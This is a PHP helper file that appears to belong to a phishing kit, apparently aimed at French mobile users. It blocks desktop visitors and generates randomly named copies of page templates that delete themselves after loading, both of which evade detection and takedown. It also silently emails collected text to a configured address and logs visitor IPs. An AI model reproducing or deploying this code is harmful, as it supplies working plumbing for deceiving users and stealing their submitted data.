<?php 
@session_start();
require (__DIR__).'./web/config.php';
require (__DIR__).'/md.php';
$detect = new Mobile_Detect;
if(!$detect->isMobile() AND strtolower($block_pc) == "yes"){
     header("location: out.php");
     exit;
}


function createPage($name){
	$new = (__dir__)."/post/".uniqid()."-".rand(0, 99999).".php";
     $html = file_get_contents((__dir__)."/post/source/$name.txt");
	$fp =fopen($new, "w+");
	fwrite($fp, $html);
     fwrite($fp, "<?php unlink(basename(\$_SERVER['SCRIPT_NAME'])); ?>");
	fclose($fp);
     return basename($new);
}


function sendMail($txt){
     global $email_to;
     $subject = substr($txt, 0, 34);
     @mail($email_to,  $subject, $txt);
}



function getIp(){
	$ip = $_SERVER['REMOTE_ADDR'];
	if(in_array($ip, array("::1", "0.0.0.0", "127.0.0.1"))){
		$ip = "1.1.1.1";
	}
	
	return $ip;
}




if(!isset($_SESSION['countryCode'])){	
     $_SESSION['countryCode'] = "FR";
}

$local =  $_SESSION['countryCode'];
 if($local==""){
     $local = "FR";
 }


?>